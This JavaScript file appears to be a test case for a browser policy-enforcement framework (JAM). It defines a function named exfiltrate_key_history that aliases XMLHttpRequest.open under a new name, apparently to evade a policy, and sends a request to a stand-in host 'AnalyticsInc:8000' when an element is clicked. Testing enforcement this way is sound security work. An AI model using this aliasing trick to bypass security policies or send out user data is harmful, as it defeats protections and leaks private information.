
JAM.startProfile('load');
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v0 = xmlhttp;
  var v2 = xmlhttp.open;
  introspect(JAM.policy.pC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1) {
    var v3 = v2.bind(xmlhttp)
  }
  v0.opennew = v3;
  introspect(JAM.policy.pC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1) {
    xmlhttp.opennew("GET", "http://AnalyticsInc:8000/submission.html?test=clone2", true)
  }
  introspect(JAM.policy.pC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1) {
    xmlhttp.send(null)
  }
  return
}
var v1 = document.getElementById("test");
v1.onclick = exfiltrate_key_history;

JAM.stopProfile('load');
